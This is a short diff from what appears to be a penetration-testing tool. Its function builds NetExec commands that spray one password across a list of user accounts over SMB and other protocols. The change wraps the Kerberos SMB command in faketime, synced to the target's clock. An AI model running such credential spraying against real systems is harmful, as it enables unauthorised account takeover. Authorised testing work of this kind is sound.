@@ -55,7 +55,7 @@ def spray_passwd(target, users_file, passwd, sprayable_ports, log_file):
         else:
             auth_flag = '-p'
         if proto == 'smb':
-            cmd = f"nxc smb {target} -u {users_file} {auth_flag} '{passwd}' -k --continue-on-success"
+            cmd = f"faketime \"$(rdate -n {target} -p | awk '{{print $2, $3, $4}}' | date -f - \"+%Y-%m-%d %H:%M:%S\")\" nxc smb {target} -u {users_file} {auth_flag} '{passwd}' -k --continue-on-success"
         else:
             cmd = f"nxc {proto} {target} -u {users_file} {auth_flag} '{passwd}' --continue-on-success"
         # write_log(log_file, f"Executing: {cmd}")
